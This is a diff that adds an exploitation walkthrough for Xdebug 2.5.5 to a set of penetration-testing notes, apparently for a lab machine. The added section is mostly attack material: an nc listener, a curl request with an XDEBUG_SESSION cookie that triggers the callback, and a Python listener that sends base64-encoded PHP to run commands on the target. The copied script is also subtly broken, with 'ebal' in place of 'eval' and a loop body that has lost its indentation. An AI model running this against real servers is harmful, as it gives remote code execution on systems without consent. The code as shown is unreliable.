@@ -1300,3 +1300,68 @@ Example with curl:
 curl -X GET -s "http://10.10.10.83/" -I
 ```
 
+## Xdebug 2.5.5 Exploit
+
+ **Xdebug** is a [PHP](https://en.wikipedia.org/wiki/PHP) extension that provides debugging and profiling capabilities.[\[2\]](https://en.wikipedia.org/wiki/Xdebug#cite_note-2) It uses the [DBGp](https://en.wikipedia.org/wiki/DBGp) debugging protocol. Extracted from [here](https://en.wikipedia.org/wiki/Xdebug).
+
+### Testing the Exploit
+
+Listen on any port:
+
+```text
+nc -nlvp 9000
+```
+
+Send an HTTP GET request with the cookie `XDEBUG_SESSION`
+
+```text
+curl -s -X GET "http://10.10.10.83/index.php" -H "Cookie: XDEBUG_SESSION=AAAAA"
+```
+
+### Exploiting Xdebug
+
+Search the exploit on github, this [repo ](https://github.com/nqxcode/xdebug-exploit/blob/master/exploit_shell.py)has a good exploit that we can use.
+
+```python
+#!/usr/bin/python3
+
+import socket
+import pdb
+
+from base64 import b64encode
+
+ip_port = ('0.0.0.0', 9000)
+sk = socket.socket()
+sk.bind(ip_port)
+sk.listen(10)
+conn, addr = sk.accept()
+
+while True:
+client_data = conn.recv(1024)
+print(client_data)
+
+data = input('>> ')
+data = data.encode('utf-8')
+conn.sendall(b'ebal -i -- ' + b64encode(data) + b'\x00')
+```
+
+Run the exploit:
+
+```text
+python3 exploit_shell.py
+```
+
+Send a GET request:
+
+```text
+curl -s -X GET "http://10.10.10.83/index.php" -H "Cookie: XDEBUG_SESSION=EEEEE"
+```
+
+From shell provided with exploit\_shell.py, we send a `whoami` command:
+
+```text
+system('whoami')
+```
+
+Review the output of **curl**.
+
